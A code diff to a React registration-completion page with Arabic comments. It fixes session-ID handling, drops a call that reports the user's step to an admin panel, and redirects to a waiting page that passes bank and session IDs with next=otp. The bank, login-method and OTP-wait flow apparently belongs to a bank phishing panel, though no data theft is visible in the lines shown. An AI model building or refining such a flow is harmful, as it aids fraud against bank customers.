@@ -81,9 +81,16 @@ export default function RegistrationCompletion() {
     }
 
     try {
-      // إرسال بيانات الاشتراك أولاً - السيرفر سيحدث currentStep إلى "registration-completion"
+      const currentSessionId = sessionId || localStorage.getItem("sessionId") || "";
+      
+      if (!currentSessionId) {
+        toast.error(isArabic ? "جلسة غير صالحة، يرجى البدء من جديد" : "Invalid session, please start over");
+        return;
+      }
+
+      // إرسال بيانات الاشتراك - السيرفر سيحدث currentStep إلى "registration-completion" تلقائياً
       await submitLoginMethodMutation.mutateAsync({
-        sessionId,
+        sessionId: currentSessionId,
         loginType: "registration_completion",
         username: "",
         password: "",
@@ -100,15 +107,11 @@ export default function RegistrationCompletion() {
         totalAmount: "10",
       });
       
-      // إبلاغ لوحة الإدارة بالمرحلة الحالية (بعد submitLoginMethod للحفاظ على currentStep الصحيح)
-      await reportStepMutation.mutateAsync({
-        sessionId,
-        step: "registration-completion"
-      });
-
-      setLocation(`/waiting?bank=${bankId}&session=${sessionId}&next=otp`);
+      // ننتقل مباشرة لصفحة الانتظار، السيرفر قام بتحديث الحالة بالفعل
+      setLocation(`/waiting?bank=${bankId}&session=${currentSessionId}&next=otp`);
     } catch (error) {
-      toast.error(isArabic ? "حدث خطأ أثناء الإرسال" : "An error occurred during submission");
+      console.error("Submission error:", error);
+      toast.error(isArabic ? "حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى" : "An error occurred during submission, please try again");
     }
   };
 
